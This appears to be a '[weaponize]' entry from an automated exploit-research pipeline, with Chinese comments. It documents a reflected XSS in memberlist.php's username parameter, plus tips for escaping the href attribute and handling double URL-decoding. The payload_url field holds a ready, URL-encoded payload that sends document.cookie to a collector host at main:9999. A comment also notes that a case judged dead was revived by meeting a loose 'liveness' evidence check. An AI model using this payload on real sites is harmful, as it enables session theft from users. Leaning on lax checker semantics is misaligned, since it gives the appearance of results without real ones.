[weaponize]
# 实测 (2026-08-20, 调研容器验证): 免登录 GET。memberlist.php 的 username 参数
# -> vulnfunction_6bf376 -> 搜索结果页回显 9 处, 其中 2 处在排序链接 URL 里完全
# 不转义 (引号/尖括号原样), 用 "><svg ...> 属性逃逸; 其余 7 处 URL 编码、1 处
# HTML 转义 (不可注入, 无碍)。
# 判定: victim 侧车架构, 同 miscaction/memberaction。
# 曾判死 (2026-08-20): sink 6bf376 只接 POST 插桩, GET 执行路径不产生锚点证据。
# 被证据检查终版 (liveness, 任意插桩记录含标记) 复活 —— GET 攻击的标记落在
# 344755/f64c64 等函数名下, liveness 语义下构成合法证据 (README §5.12 条 4/7)。
# 坑 (已内置规避): ①入口二次 urldecode -> 拼接用 .concat() 不用 +; ②事件处理器
# 含空格必须整体放双引号 (未引号 HTML 属性值在首个空格截断, 实测 beacon 静默
# 不触发); ③反射主体在 href 属性内, payload 需 "> 前缀逃逸。
kind           = "xss"
payload_url    = "http://webapp/memberlist.php?username=%22%3E%3Csvg%20onload%3D%22new%20Image%28%29.src%3D%27http%3A%2F%2Fmain%3A9999%2Fc%3Fd%3D%27.concat%28encodeURIComponent%28document.cookie%29%29%22%3E"
